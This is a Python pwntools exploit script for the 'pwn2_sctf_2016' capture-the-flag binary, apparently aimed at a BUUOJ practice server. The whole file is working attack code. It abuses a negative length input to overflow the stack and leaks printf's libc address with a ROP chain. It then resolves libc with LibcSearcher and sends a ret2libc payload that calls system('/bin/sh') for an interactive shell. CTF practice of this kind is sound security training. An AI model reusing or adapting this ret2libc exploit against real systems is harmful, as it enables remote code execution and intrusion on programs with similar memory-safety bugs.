# coding:utf-8

from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

#p = process('pwn2_sctf_2016')
p = remote('node3.buuoj.cn', 25974)
elf = ELF('pwn2_sctf_2016')

main_addr = elf.sym['main']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
format_str = 0x080486F8 

p.sendlineafter('read? ', '-666')

payload1 = 'a' * 0x30 + p32(printf_plt) + p32(main_addr) + p32(format_str) + p32(printf_got)

p.sendlineafter('data!\n', payload1)

p.recvuntil('said: ')
p.recvuntil('said: ')

printf_addr = u32(p.recv(4))
print('printf_addr: ', hex(printf_addr))
libc = LibcSearcher('printf', printf_addr)

libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
bin_sh_str = libc_base + libc.dump('str_bin_sh')
        
p.sendlineafter('read? ', '-666')
payload2 = 'a' * 0x30 + p32(system_addr) + p32(main_addr) + p32(bin_sh_str)
p.sendlineafter('data!\n', payload2)
p.interactive()
